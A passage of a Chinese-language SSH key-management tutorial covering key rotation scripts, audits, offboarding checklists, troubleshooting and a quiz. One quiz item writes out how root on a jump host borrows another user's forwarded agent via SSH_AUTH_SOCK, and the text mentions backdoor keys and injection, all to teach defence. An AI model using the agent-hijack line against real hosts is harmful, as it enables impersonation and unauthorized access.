    echo "✓ 已永久刪除 ${REMOVED} 行超過 ${DAYS} 天的停用金鑰"
    ;;

  rollback)
    LAST="$(ls -1t "$BACKUP_DIR/${ACCOUNT}."* 2>/dev/null | head -1 || true)"
    [ -n "$LAST" ] || die "找不到 ${ACCOUNT} 的備份"
    echo "將還原：$LAST → $AK"
    cp -p "$LAST" "$AK"
    chown "$ACCOUNT": "$AK"; chmod 600 "$AK"
    echo "✓ 已還原"
    ;;

  *) usage ;;
esac

# ── 收尾驗證（★★★ 每個動作之後都做）──────────────────────
echo ""
echo "── 目前生效的金鑰 ──"
ssh-keygen -lf "$AK" || die "★★★★ authorized_keys 解析失敗，立即執行：ssh-key-rotate rollback ${ACCOUNT}"
ls -ld "$HOME_DIR" "$HOME_DIR/.ssh" "$AK"
ROT
sudo chmod 750 /usr/local/bin/ssh-key-rotate
```

**三步驟輪替實作**：

```bash
# 【1】加新金鑰（舊的還在，服務不中斷）
sudo /usr/local/bin/ssh-key-rotate add ops /tmp/ops-wangxm-2027.pub
```

預期輸出：

```text
  備份：/var/backups/ssh-authorized-keys/ops.20260828-111502
✓ 已加入新金鑰：SHA256:9Pq2Wm4XvL7bR1nT8cZ5yE3sK6hA0jU9dI4oG2fN7xM

★★★★ 下一步【不要跳過】：
   另開一個新終端，用新金鑰實測登入：
     ssh -o IdentitiesOnly=yes -o PasswordAuthentication=no \
         -i <新私鑰> ops@web01.example.gov.tw 'id'
   確認成功後，才執行：
     ssh-key-rotate retire ops <舊金鑰註解>
```

```bash
# 【2】★★★★ 在【另一個新終端】實測（這一步是整個流程的重點）
ssh -o IdentitiesOnly=yes -o PasswordAuthentication=no \
    -i ~/.ssh/id_ed25519_ops_2027 ops@web01.example.gov.tw 'id'
```

預期輸出：

```text
uid=1001(ops) gid=1001(ops) groups=1001(ops),27(sudo)
```

```bash
# 【3】確認成功後才停用舊的（註解掉，不刪除）
sudo /usr/local/bin/ssh-key-rotate retire ops ops-wangxm-2026
```

預期輸出：

```text
  備份：/var/backups/ssh-authorized-keys/ops.20260828-111744
✓ 已停用（註解）舊金鑰：ops-wangxm-2026
  七天後執行 purge 才會真正刪除：ssh-key-rotate purge ops

── 目前生效的金鑰 ──
256 SHA256:9Pq2Wm4XvL7bR1nT8cZ5yE3sK6hA0jU9dI4oG2fN7xM ops-wangxm-2027 (ED25519)
```

**回滾**（發現輪替後有系統連不上時）：

```bash
sudo /usr/local/bin/ssh-key-rotate rollback ops
```

★★★★ 回滾是**立即生效**的 —— `authorized_keys` 不需要 reload sshd，
新的連線馬上就會讀到新內容。已建立的連線不受影響（所以終端 A 才要留著）。

**七天後清除**：

```bash
sudo /usr/local/bin/ssh-key-rotate purge ops 7
```

預期輸出：

```text
✓ 已永久刪除 1 行超過 7 天的停用金鑰
```

### 步驟【7】驗收檢查表

| # | 檢查項 | 指令 | 預期結果 | 星級 |
| --- | --- | --- | --- | --- |
| 1 | 每人一把、有註解 | `sudo ssh-keygen -lf /home/ops/.ssh/authorized_keys` | 三行，註解為 `ops-姓名-年份` | ★★★★ |
| 2 | 私鑰都有 passphrase | `ssh-keygen -y -P "" -f ~/.ssh/id_ed25519_ops` | 印出 `incorrect passphrase` | ★★★★ |
| 3 | 權限鏈正確 | `ls -ld ~ ~/.ssh ~/.ssh/authorized_keys` | `drwxr-x---` / `drwx------` / `-rw-------` | ★★★★ |
| 4 | **另開終端可用金鑰登入** | `ssh -o PasswordAuthentication=no -i <key> ops@host id` | 印出 `uid=1001(ops)` | ★★★★★ |
| 5 | CI 金鑰拿不到 shell | `ssh -i deploy_ci deployer@host` | 印出「此金鑰不提供互動式登入」 | ★★★★ |
| 6 | CI 金鑰跨網段連不上 | 從非 `10.10.90.0/24` 連 | `Permission denied (publickey)` | ★★★★ |
| 7 | agent forwarding 已關 | `ssh -A host 'echo $SSH_AUTH_SOCK'` | 空字串 | ★★★★★ |
| 8 | 稽核腳本乾淨 | `sudo ssh-key-audit; echo $?` | `結果：✓ 全部合規`、exit `0` | ★★★★ |
| 9 | 稽核排程已啟用 | `systemctl list-timers ssh-key-audit.timer` | 有下次執行時間 | ★★★ |
| 10 | 名冊與實機一致 | 比對 CSV 報表的「在名冊」欄 | 全部為 `是` | ★★★★ |
| 11 | 伺服器日誌無 refused | `sudo journalctl -u ssh -p warning -n 50` | 無 `Authentication refused` | ★★★ |
| 12 | 備份可回滾 | `ls -l /var/backups/ssh-authorized-keys/` | 有帶時間戳的備份檔 | ★★★ |

### 步驟【8】★★★★ 離職／異動當日 checklist

```text
□ 【1】從名冊查出該員所有金鑰註解（可能不只一把：筆電、備機、家用）
       grep '<姓名>' /etc/ssh/keyreg/registry.csv
□ 【2】全機退場（每一台都要）
       for h in $(cat /etc/ssh/keyreg/hosts.txt); do
         ssh $h "sudo ssh-key-rotate retire ops ops-<姓名>-2026"
       done
□ 【3】跑稽核確認沒有漏網
       for h in ...; do ssh $h 'sudo ssh-key-audit' ; done
□ 【4】檢查【非標準路徑】的家目錄（/var/www、/srv、/opt/app）
□ 【5】檢查 GitHub / GitLab / 內部 Git 伺服器上的個人金鑰與 Deploy Key
□ 【6】檢查網通設備、NAS、iDRAC/IPMI 上是否另有該員金鑰
□ 【7】名冊狀態改成「已註銷」，記錄註銷日期與執行人
□ 【8】七天後 purge，並保留稽核報表【至少一年】作為軌跡
```

★★★★ 第【4】步是最常漏的：`deployer`、`www-data`、`gitlab-runner` 這類服務帳號的
`authorized_keys` 裡常常躺著離職同仁「當初為了除錯先加一下」的個人公鑰。

---

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| ★★★★ 公鑰已部署，登入仍要求密碼；客戶端 `-vvv` 看不出原因 | 家目錄／`.ssh`／`authorized_keys` 權限或擁有者不符，`StrictModes` 靜默忽略 | 伺服器端 `journalctl -u ssh \| grep refused` 找 `bad ownership or modes`；`chmod go-w ~; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys; chown -R user: ~/.ssh` |
| ★★★★ `Permission denied (publickey)`，伺服器日誌**完全沒有** refused 訊息 | 公鑰根本沒進檔案（貼壞、貼到別的帳號）、或 `AuthorizedKeysFile` 指向別處 | `sudo ssh-keygen -lf <檔案>` 數行數；`sshd -T \| grep -i authorizedkeysfile` 確認實際路徑 |
| ★★★★ RHEL 系上權限全對、日誌無異常，公鑰仍不生效 | SELinux context 不是 `ssh_home_t`（手動建目錄或用 `cp` 造成） | `sudo restorecon -R -v ~/.ssh`；`sudo ausearch -m avc -ts recent \| grep ssh` |
| ★★★ `Received disconnect ... Too many authentication failures` | agent 內金鑰過多，超過伺服器 `MaxAuthTries`（預設 6） | `ssh -o IdentitiesOnly=yes -i <key>`；長久解在 `~/.ssh/config` 逐站指定 `IdentityFile` + `IdentitiesOnly yes` |
| ★★★★ `sign_and_send_pubkey: signing failed for ED25519 ... agent refused operation` | agent 裡的金鑰已被 `-t` 逾時移除、agent 被 `-x` 鎖定，或 FIDO2 金鑰沒有碰觸 | `ssh-add -l` 確認還在；重新 `ssh-add`；硬體金鑰要按下去 |
| ★★★ `Load key "…": bad permissions` | **私鑰**檔權限太鬆（群組或其他人可讀） | `chmod 600 ~/.ssh/id_ed25519_ops` |
| ★★★ `Load key "…": error in libcrypto` | 私鑰檔損毀、被文字編輯器改成 CRLF、或工具期待 PEM 卻拿到 OpenSSH 格式 | `head -1` 看格式；`ssh-keygen -y -f <key>` 測試可否開啟；必要時 `ssh-keygen -p -m PEM` 轉換 |
| ★★★ `Could not open a connection to your authentication agent.` | `SSH_AUTH_SOCK` 未設：新開的終端、`sudo` 之後、cron／systemd 環境 | 互動情境 `eval "$(ssh-agent -s)"` 或改用 systemd user unit；★★★★ 排程情境不要用 agent，改用受限的機器金鑰 |
| ★★★★ `command=` 金鑰登入後立刻斷線，對方回報「rsync／git 跑不了」 | 包裝腳本沒有處理 `$SSH_ORIGINAL_COMMAND`，或用了 `eval` 導致被注入 | 用白名單 `case` 解析 `$SSH_ORIGINAL_COMMAND`；rsync 直接用 `rrsync -ro <dir>` |
| ★★★★ 部署金鑰「昨天還好好的，今天全部失敗」 | `expiry-time=` 到期（靜默拒絕），或 CI 出口 IP 改變導致 `from=` 不符 | 日誌看 `Authentication refused: expired key`；`ssh host 'echo $SSH_CONNECTION'` 確認實際來源 IP |
| ★★★ 公鑰貼上後 `ssh-keygen -lf` 少一行 | 編輯器自動換行把 base64 截斷；或選項欄與金鑰間夾了 Tab | 用 `ssh-copy-id` 或 `cat >> ... <<'EOF'` 貼；`awk 'NF && $0!~/^#/{print NR": "NF}'` 檢查每行欄位數 |
| ★★★★★ 關掉密碼登入後全員都進不去 | 沒有在**另一個新終端**實測金鑰就改 `sshd_config` | 用 IPMI／iDRAC／VM 主控台進入單機模式復原；★★★★ 事前預防：終端 A 不關 + `sshd -t` + 用 `-p` 起第二個 sshd 測試 |
| ★★★ fail2ban 把自己的 IP 鎖了 | 反覆試誤登入累積失敗紀錄（常伴隨 `Too many authentication failures`） | `sudo fail2ban-client status sshd`；`sudo fail2ban-client set sshd unbanip <IP>`；先修好 `IdentitiesOnly` 再重試 |

### 排查步驟

遇到「金鑰登不進去」時，**照這個順序查，不要跳號**。

**【1】確認客戶端真的送出了正確那把金鑰**

```bash
ssh -v -o IdentitiesOnly=yes -i ~/.ssh/id_ed25519_ops ops@10.10.20.31 true 2>&1 | grep -E 'Offering|Server accepts|Authentications that can continue'
```

預期輸出（正常）：

```text
debug1: Offering public key: /home/wangxm/.ssh/id_ed25519_ops ED25519 SHA256:cNg... explicit
debug1: Server accepts key: /home/wangxm/.ssh/id_ed25519_ops ED25519 SHA256:cNg... explicit
```

- 看到 `Server accepts key` → **客戶端沒問題**，若仍失敗，問題在登入後的階段（`command=`、shell 被設成 `nologin`），跳到【6】。
- 只有 `Offering` 沒有 `accepts` → 伺服器不接受這把，往【2】。
- 連 `Offering` 都沒有 → 客戶端根本沒讀到金鑰檔，往【5】。

**【2】確認指紋在伺服器的 `authorized_keys` 裡**

客戶端：

```bash
ssh-keygen -lf ~/.ssh/id_ed25519_ops.pub
```

```text
256 SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ ops-wangxm-2026 (ED25519)
```

伺服器（終端 A）：

```bash
sudo ssh-keygen -lf /home/ops/.ssh/authorized_keys
```

- 找得到同一串 `SHA256:cNg...` → 金鑰有進去，往【3】（多半是權限問題）。
- 找不到 → 公鑰沒部署成功或貼壞了，回去重貼。
- ★★★ 行數比你貼的少 → 有公鑰被換行截斷。

**【3】看伺服器端日誌（★★★★ 這一步最關鍵）**

```bash
sudo journalctl -u ssh --since "5 min ago" --no-pager | grep -iE 'refused|invalid|failed|error'
```

| 看到什麼 | 問題在哪 | 下一步 |
| --- | --- | --- |
| `Authentication refused: bad ownership or modes for directory /home/ops` | ★★★★ 家目錄權限 | `chmod go-w /home/ops` |
| `Authentication refused: bad ownership or modes for file .../authorized_keys` | ★★★★ 檔案權限或擁有者 | `chown ops: ...; chmod 600 ...` |
| `Authentication refused: expired key` | ★★★★ `expiry-time=` 到期 | 更新選項欄或輪替金鑰 |
| `Authentication refused: client IP address not allowed` | ★★★★ `from=` 不符 | 往【4】確認真實來源 IP |
| `Invalid user ops from ...` | 帳號不存在 | 檢查帳號名稱 |
| `User ops not allowed because account is locked` | ★★★ 帳號被鎖 | `sudo passwd -S ops`，見 [[02-密碼與帳號管理實務]] |
| **完全沒有任何訊息** | 連線根本沒到伺服器 | 網路／防火牆問題，見 [[02-防火牆-ufw基礎與實務]] |

RHEL 系用 `journalctl -u sshd`。看不到細節時把 `sshd_config` 的 `LogLevel` 調成 `VERBOSE`
（會記錄每次認證嘗試的公鑰指紋，★★★★ 對稽核也很有用），詳見 [[04-sshd-伺服器端設定]] 與 [[19-日誌系統]]。

**【4】確認伺服器看到的來源 IP**

```bash
ssh ops@10.10.20.31 'echo $SSH_CONNECTION; who am i'
```

預期輸出：

```text
10.10.90.14 51422 10.10.20.31 22
ops      pts/2        2026-08-28 11:22 (10.10.90.14)
```

★★★★ 第一個欄位就是 `from=` 必須寫的 IP。
走 NAT 或 ProxyJump 時它**不會**是你筆電的 IP。

**【5】確認客戶端讀得到金鑰檔**

```bash
ls -l ~/.ssh/id_ed25519_ops && ssh-keygen -y -f ~/.ssh/id_ed25519_ops > /dev/null && echo "私鑰可正常開啟"
```

```text
-rw------- 1 wangxm wangxm 464 Aug 28 09:14 /home/wangxm/.ssh/id_ed25519_ops
Enter passphrase for "/home/wangxm/.ssh/id_ed25519_ops":
私鑰可正常開啟
```

- `bad permissions` → `chmod 600`。
- `error in libcrypto` → 檔案損毀，從備份復原。

**【6】`command=` 金鑰專用：確認包裝腳本**

```bash
ssh -i ~/.ssh/deploy_ci deployer@10.10.20.31 "status"; echo "exit=$?"
```

```text
目前版本：v1.2.0（部署於 2026-08-27 16:44）
exit=0
```

若沒有輸出而是直接斷線，到伺服器上檢查：

```bash
sudo ls -l /usr/local/bin/deploy-wrapper
sudo tail -20 /var/log/deploy-wrapper.log
```

★★★ 常見原因：腳本沒有 `+x`、shebang 寫錯、或該帳號的 shell 是 `/usr/sbin/nologin`
（`command=` 仍需要一個可執行的 shell 來啟動它）。

**【7】跑一次全機稽核，確認不是別的地方有問題**

```bash
sudo /usr/local/bin/ssh-key-audit; echo "exit=$?"
```

```text
 結果：✓ 全部合規
exit=0
```

---

## 安全性注意事項

> [!danger] ★★★★★ 絕對禁止（每一條都出過真實事故）
> 1. **把私鑰放進 git repo** —— 包含 `.env`、`config/`、`deploy/` 底下，以及 `tar` 起來的
>    整份專案備份。一旦推上遠端，即使之後 `git rm` 也**永遠留在歷史裡**；
>    公開 repo 被自動掃描工具撿走通常是**幾分鐘內**的事。
>    → `.gitignore` 加 `id_*`、`*.pem`、`*.key`；伺服器端用 `pre-receive` 攔截，見 [[08-Git-伺服器端與自動部署]]。
> 2. **`chmod 644` 私鑰** —— 多人共用的跳板機上，這等於把私鑰公開給所有帳號。
>    ssh 本身會拒絕使用（`bad permissions`），但**檔案內容早就被讀走了**。
> 3. **`ssh -A` 連到跳板機** —— 跳板機的 root、有 sudo 的同事、你在上面跑的任何程式，
>    都能借用你的身分登入下一台，而稽核日誌上是**你的名字**。改用 `ProxyJump`。
> 4. **整組共用一把金鑰** —— 出事時無法追責，任一人離職就要全機更換，
>    實務上等於永遠不會換。
> 5. **CI／排程使用個人金鑰** —— 該員離職後系統全掛，且所有自動化操作
>    在稽核軌跡上都掛在他頭上。一律用 `restrict,from=,command=` 的專用部署金鑰。
> 6. **把私鑰貼進工單、聊天室、email** —— 那些系統的保存期限與存取範圍不受你控制。
>    需要交付時用實體媒體或有到期的加密通道，交付後立刻輪替。
> 7. **未加密的私鑰備份** —— 備份磁帶／NAS 落入他人之手時，
>    `-a 100` 的 passphrase 是你唯一的緩衝時間。備份一律先 `gpg -c` 或 `age` 加密後離線保存。

> [!warning] ★★★★ 機關情境的額外要求
> | 要求 | 做法 | 對應 |
> | --- | --- | --- |
> | **可歸責性** | 一人一把金鑰、註解含姓名、`LogLevel VERBOSE` 記錄每次登入的指紋 | [[04-sshd-伺服器端設定]] |
> | **最小權限** | 機器帳號一律 `restrict` + `command=`；人的帳號用 `from=` 限縮來源 | 本篇〈進階應用〉 |
> | **定期盤點** | 每週自動跑 `ssh-key-audit`，報表保留至少一年 | 本篇〈完整實戰範例〉 |
> | **異動管控** | 新增／註銷金鑰要有申請單與核准紀錄，名冊與實機定期對帳 | [[09-資安稽核與符合性檢核]] |
> | **設定基準** | SSH 相關組態依 TWGCB Linux 基準檢核（`PermitRootLogin`、`PasswordAuthentication`、`MaxAuthTries` 等） | [[03-TWGCB-Linux項目分類詳解]] |
> | **檔案完整性監控** | 把 `authorized_keys` 納入 FIM，有人偷加金鑰要能立即告警 | [[04-Wazuh-FIM檔案完整性監控]] |
>
> ★★★★ 最後一項特別重要：**攻擊者取得權限後的第一件事，往往就是往
> `authorized_keys` 塞一把自己的公鑰做為後門**。定期稽核只能事後發現，
> FIM 才能即時告警。

> [!tip] ★★★ 個資與稽核軌跡
> 金鑰註解裡放姓名是刻意的設計（為了可歸責性），但這也讓 `authorized_keys` 與
> 稽核報表含有**個人資料**。因此：
> - 稽核 CSV 存放目錄權限 `750`、擁有者 `root`
> - 報表不要直接寄到私人信箱或放上公開共享空間
> - 保留期限依機關的個資保存政策訂定，到期銷毀

> [!danger] ★★★★★ 改設定前的三道保險（每一次改 SSH 相關設定都要做）
> ```bash
> # 【1】保留終端 A —— 已建立的連線不受設定變更影響
> #      不要 exit、不要關掉視窗、不要讓它逾時（可先跑 `while true; do sleep 60; done`）
>
> # 【2】語法檢查（改 sshd_config 時）
> sudo sshd -t && echo "語法 OK"
>
> # 【3】在另一個埠起一個測試用 sshd，確定新設定能登入
> sudo /usr/sbin/sshd -d -p 2222     # 前景執行，會印出完整除錯訊息
> #    另開終端：ssh -p 2222 ops@10.10.20.31
> #    測試通過再 Ctrl-C，然後才 systemctl reload ssh
> ```
> `authorized_keys` 的變更**不需要 reload**，即時生效 —— 這既是方便，
> 也代表**貼錯會立刻生效**，所以每次改完都要在新終端實測。

---

## 速查表

### 金鑰產生與檢查

| 指令 | 說明 | 星級 |
| --- | --- | --- |
| `ssh-keygen -t ed25519 -a 100 -C "用途-姓名-年份"` | ★★★★ 標準產生指令 | ★★★★ |
| `ssh-keygen -t rsa -b 4096 -a 100 -C "…"` | 對接老設備時用 | ★★★ |
| `ssh-keygen -lf <公鑰或 authorized_keys>` | 列出指紋、長度、型別、註解 | ★★★★ |
| `ssh-keygen -lf <檔> -E md5` | 用 MD5 顯示指紋（對接老系統時） | ★★ |
| `ssh-keygen -y -f <私鑰>` | 從私鑰重生公鑰（★★★ 不含註解） | ★★★ |
| `ssh-keygen -y -P "" -f <私鑰>` | ★★★★ 檢測私鑰有無 passphrase（成功=沒有） | ★★★★ |
| `ssh-keygen -p -a 100 -f <私鑰>` | 補設／更換 passphrase（公鑰不變） | ★★★★ |
| `ssh-keygen -p -m PEM -f <私鑰>` | 轉成舊 PEM 格式 | ★★ |
| `ssh-keygen -c -C "新註解" -f <私鑰>` | 修改註解 | ★★ |

### ssh-agent

| 指令 | 說明 | 星級 |
| --- | --- | --- |
| `eval "$(ssh-agent -s)"` | 啟動 agent 並設好環境變數 | ★★★ |
| `ssh-add <私鑰>` | 加入金鑰 | ★★★ |
| `ssh-add -t 28800 <私鑰>` | ★★★★ 一個工作日後自動移除 | ★★★★ |
| `ssh-add -c <私鑰>` | ★★★★★ 每次使用都要人工確認 | ★★★★★ |
| `ssh-add -l` / `-L` | 列指紋／列完整公鑰 | ★★★ |
| `ssh-add -d <私鑰>` / `-D` | 移除單一／清空全部 | ★★★★ |
| `ssh-add -x` / `-X` | 鎖定／解鎖 agent | ★★ |
| `systemctl --user enable --now ssh-agent.service` | 常駐 agent（自建 unit） | ★★★ |

### authorized_keys 選項

| 選項 | 用途 | 星級 |
| --- | --- | --- |
| `restrict` | ★★★★ 機器金鑰起手式，關掉所有轉發與 PTY | ★★★★ |
| `from="10.10.90.0/24"` | 限制來源（NAT 後要寫出口 IP） | ★★★★ |
| `command="/usr/local/bin/x"` | 強制執行單一指令，原指令在 `$SSH_ORIGINAL_COMMAND` | ★★★★ |
| `expiry-time="20271231"` | 到期自動失效（外包／短期支援必加） | ★★★★ |
| `no-agent-forwarding` | 單獨禁用 agent forwarding | ★★★★ |
| `permitopen="10.10.40.5:3306"` | 只准轉發到這個目的地 | ★★★ |
| `verify-required` | FIDO2 必須輸入 PIN | ★★★★ |
| `pty` / `port-forwarding` | 在 `restrict` 之後個別放行 | ★★★ |

### 路徑與權限

| 路徑 | 權限 | 說明 | 星級 |
| --- | --- | --- | --- |
| `~`（家目錄） | 不可群組／其他人可寫 | ★★★★ 最常被忽略 | ★★★★ |
| `~/.ssh` | `700` | | ★★★★ |
| `~/.ssh/authorized_keys` | `600` | 伺服器端的公鑰清單 | ★★★★ |
| `~/.ssh/id_*`（私鑰） | `600` | 過鬆時 ssh 拒絕使用 | ★★★★ |
| `~/.ssh/id_*.pub` | `644` | 公鑰，可公開 | ★ |
| `~/.ssh/config` | `600` | 見 [[03-SSH-客戶端設定檔]] | ★★★ |
| `~/.ssh/known_hosts` | `600` | 見 [[01-SSH-原理與第一次連線]] | ★★ |
| `/etc/ssh/sshd_config` | `600` | 見 [[04-sshd-伺服器端設定]] | ★★★ |

### 判斷準則

| 情況 | 該怎麼做 | 星級 |
| --- | --- | --- |
| 新產生一把金鑰 | ed25519 + `-a 100` + passphrase + `用途-姓名-年份` 註解 | ★★★★ |
| 要給 CI／備份／監控用 | 專用金鑰 + `restrict,from=,command=` + `expiry-time=` | ★★★★ |
| 要經過跳板機 | `ProxyJump`，**不要** `ForwardAgent` | ★★★★★ |
| 公鑰放好卻要密碼 | 先查**伺服器端日誌**的 `Authentication refused` | ★★★★ |
| `Too many authentication failures` | 加 `-o IdentitiesOnly=yes` | ★★★ |
| 要換掉一把金鑰 | 先加新 → 新終端實測 → 註解舊 → 七天後刪 | ★★★★ |
| 伺服器 30 台以上、人員異動頻繁 | 評估導入 SSH CA 短效憑證 | ★★★ |
| 高權限帳號（root 跳板、CA 主機） | FIDO2 硬體金鑰 + `verify-required` | ★★★★ |

---

## 練習題

> [!question]- 練習 1：把一把「裸奔」的部署金鑰改造成受限金鑰
> 某台伺服器的 `deployer` 帳號有這一行：
>
> ```text
> ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQw3ErTy...Uio5 deployer@jenkins
> ```
>
> 已知：CI 主機在 `10.10.90.11`，只需要能執行 `/usr/local/sbin/deploy-portal.sh`，
> 契約到 2027 年底。請寫出改造後的那一行，並說明改造前後攻擊者拿到私鑰的差別。
>
> **參考解答**
>
> ```text
> restrict,from="10.10.90.11",command="/usr/local/bin/deploy-wrapper",expiry-time="20271231" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQw3ErTy...Uio5 deploy-ci-portal-2026
> ```
>
> 順便把註解從 `deployer@jenkins` 改成 `deploy-ci-portal-2026`（★★★★ 註解是盤點的唯一線索，
> `deployer@jenkins` 在 Jenkins 主機改名後就失去意義）。
>
> 差別：
>
> | | 改造前 | 改造後 |
> | --- | --- | --- |
> | 從任意 IP 連入 | ★★★★★ 可以，拿到完整 shell | 直接 `Permission denied`（`from=`） |
> | 從 CI 主機連入 | 完整 shell、可 sudo、可埠轉發 | 只能跑白名單內的三個動作 |
> | 建立反向隧道當後門 | ★★★★ 可以（`-R`） | `restrict` 已禁用 |
> | 借用 agent | 可以 | `restrict` 已禁用 |
> | 2028 年還能用 | 可以（除非有人記得刪） | 自動失效 |
>
> ★★★★ 注意 `command=` 指向的是**包裝腳本**而不是直接指向 `deploy-portal.sh`，
> 這樣才有地方做參數白名單與稽核記錄。

> [!question]- 練習 2：找出「公鑰放好卻還要密碼」的真正原因
> 同仁回報：他把公鑰貼進 `/home/ops/.ssh/authorized_keys` 了，
> 但 `ssh ops@web01` 還是問密碼。他已經試過重貼三次。
> 請寫出你會依序執行的**四個**指令，以及每個指令要看什麼。
>
> **參考解答**
>
> ```bash
> # 【1】客戶端：確認送出的是哪一把、伺服器有沒有接受
> ssh -v -o IdentitiesOnly=yes -i ~/.ssh/id_ed25519_ops ops@web01 true 2>&1 \
>   | grep -E 'Offering|Server accepts'
> #   → 只有 Offering 沒有 accepts，代表伺服器端拒絕
>
> # 【2】伺服器端（終端 A）：確認指紋真的在檔案裡
> sudo ssh-keygen -lf /home/ops/.ssh/authorized_keys
> #   → 指紋對得上，代表檔案內容沒問題，往下查權限
>
> # 【3】★★★★ 伺服器端日誌：真正的答案在這裡
> sudo journalctl -u ssh --since "5 min ago" --no-pager | grep -i refused
> #   → Authentication refused: bad ownership or modes for directory /home/ops
>
> # 【4】確認並修正權限鏈
> ls -ld /home/ops /home/ops/.ssh /home/ops/.ssh/authorized_keys
> #   → drwxrwxr-x（775，群組可寫）→ 這就是原因
> sudo chmod go-w /home/ops
> ```
>
> ★★★★ 重點在【3】：這位同仁重貼三次都沒用，是因為問題**根本不在檔案內容**。
> 客戶端無論加多少個 `-v` 都看不到 `StrictModes` 的拒絕原因 ——
> **必須去伺服器端看日誌**。RHEL 系服務名是 `sshd`。

> [!question]- 練習 3：設計三人團隊的金鑰輪替與離職流程
> 假設王小明明天離職，他有兩把金鑰（`ops-wangxm-2026` 筆電、`ops-wangxm-nb2-2026` 備機），
> 你管理 12 台伺服器。寫出你的執行步驟，並說明為什麼「直接 `sed -i` 刪掉那兩行」不夠。
>
> **參考解答**
>
> ```bash
> # 【1】從名冊查出所有金鑰（不能只憑印象）
> grep '王小明' /etc/ssh/keyreg/registry.csv
>
> # 【2】12 台全部退場（註解而非刪除，保留七天可回溯）
> for h in $(cat /etc/ssh/keyreg/hosts.txt); do
>   for k in ops-wangxm-2026 ops-wangxm-nb2-2026; do
>     ssh "$h" "sudo /usr/local/bin/ssh-key-rotate retire ops $k" || echo "❌ $h / $k 失敗"
>   done
> done
>
> # 【3】跑稽核確認沒有漏網（★★★★ 這才是驗收，不是【2】）
> for h in $(cat /etc/ssh/keyreg/hosts.txt); do
>   echo "=== $h ==="; ssh "$h" 'sudo /usr/local/bin/ssh-key-audit' || true
> done
>
> # 【4】名冊改狀態，七天後 purge
> ```
>
> 「直接 `sed -i` 刪」不夠的四個理由：
>
> 1. ★★★★ **只刪 `ops` 帳號不夠**：`deployer`、`www-data`、`gitlab-runner`、`root`
>    這些帳號的 `authorized_keys` 裡可能也有他的公鑰，而且家目錄可能在 `/var/www`、`/srv`。
>    `ssh-key-audit` 是從 `/etc/passwd` 掃**所有**家目錄，才抓得到。
> 2. ★★★★ **刪了就沒得回溯**：如果他其實還在交接期、或某支關鍵腳本剛好用他的金鑰，
>    你會需要知道原本長什麼樣。`retire` 只註解、保留七天。
> 3. ★★★ **沒有驗收動作**：`sed` 成功不代表金鑰真的失效（可能還有另一個
>    `AuthorizedKeysFile` 路徑、或某台 ssh 不通被跳過了）。要跑稽核確認。
> 4. ★★★ **漏掉非 Linux 的地方**：GitHub／內部 GitLab 的個人金鑰與 Deploy Key、
>    NAS、iDRAC/IPMI、網通設備上也可能有。checklist 才管得住。

---

## 小測驗

Q1. `ssh-keygen -t ed25519 -a 100` 裡的 `-a 100` 是什麼意思？它會不會讓 SSH 連線變慢？

Q2. 是非題：`ssh-keygen -y -P "" -f ~/.ssh/id_ed25519` 成功印出一行公鑰，代表這把私鑰**有**設 passphrase。

Q3. 同仁把公鑰貼進伺服器的 `authorized_keys`，權限也設成 600 了，但登入還是要密碼，客戶端加 `-vvv` 也看不出原因。**你會先做什麼？** 為什麼客戶端看不到原因？

Q4. 下面這一行 `authorized_keys` 有什麼問題？攻擊者拿到對應的私鑰後能做什麼？

```text
ssh-rsa AAAAB3NzaC1yc2E...abc deployer@build01
```

Q5. `ssh -A jump01` 之後，跳板機上的 root 執行下面這行會發生什麼事？

```bash
SSH_AUTH_SOCK=/tmp/ssh-Xa9kQ2/agent.9931 ssh-add -l
```

Q6. 選擇題：`ProxyJump` 相對 `ForwardAgent` 最關鍵的安全優勢是什麼？
(A) 傳輸速度比較快 (B) 跳板機上不會留下可被借用的身分 (C) 不需要在跳板機建帳號 (D) 目標機看到的來源 IP 是你的真實 IP

Q7. 出現 `Received disconnect ... Too many authentication failures` 時，**臨時**要用哪一個選項解決？只加 `-i <私鑰>` 為什麼不夠？

Q8. 你要把 `ops` 帳號的金鑰從 `ops-wangxm-2026` 換成 `ops-wangxm-2027`。寫出三個步驟的順序，並說明為什麼「舊的先刪」是錯的。

Q9. 這一行的 `command=` 包裝腳本裡寫了 `eval "$SSH_ORIGINAL_COMMAND"`，為什麼這幾乎等於沒有做限制？

Q10. 稽核腳本為什麼不能只掃 `/home` 和 `/root`？請舉出兩個實際會漏掉的位置。

> [!question]- 測驗答案
>
> **Q1.** `-a 100` 指定**私鑰檔加密時的 bcrypt KDF 迭代次數**（預設 16）。
> 它的作用範圍只有「**用 passphrase 解開私鑰檔**」這一個動作 ——
> 迭代越多次，攻擊者拿到私鑰檔後要暴力猜 passphrase 就越慢。
> ★★★ **完全不影響 SSH 連線速度**，因為連線時用的是已經解開、放在記憶體（或 agent）裡的私鑰，
> KDF 只在開檔那一瞬間跑一次。
> 代價是 `ssh-add` 時多等零點幾秒，用 agent 的話一天只發生一次。
> 所以「加了會不會變慢」的答案是：**不會，而且沒有理由不加**。
> 參見〈基礎操作 → 一、產生金鑰〉的參數表。
>
> **Q2.** ★★★★ **錯。剛好相反。**
> `-P ""` 是「用空字串當 passphrase 去開這把私鑰」。
> 開得起來（成功印出公鑰、exit code 0）代表**這把私鑰根本沒有加密** ——
> 這是高風險狀態，等同明文憑證。
> 有 passphrase 的私鑰會回：
> ```text
> Load key "...": incorrect passphrase supplied to decrypt private key
> ```
> exit code 255。
> ★★★ 這個技巧的用途是**稽核**：批次檢查同仁的私鑰有沒有偷懶不設 passphrase。
> 發現沒設的，用 `ssh-keygen -p -a 100 -f <私鑰>` 補設即可，公鑰不變、不用重新部署。
> 參見〈基礎操作 → 二、passphrase 的三個實務操作〉。
>
> **Q3.** ★★★★ **先去伺服器端看日誌**：
> ```bash
> sudo journalctl -u ssh --since "5 min ago" --no-pager | grep -i refused
> ```
> 十之八九會看到：
> ```text
> Authentication refused: bad ownership or modes for directory /home/ops
> ```
> 也就是 `authorized_keys` 本身沒錯，但**家目錄**（或 `.ssh` 目錄）權限太鬆
> —— 最常見是 `775`（群組可寫）。修正：`sudo chmod go-w /home/ops`。
>
> 客戶端看不到原因，是因為 `StrictModes`（sshd 預設 `yes`）檢查不通過時，
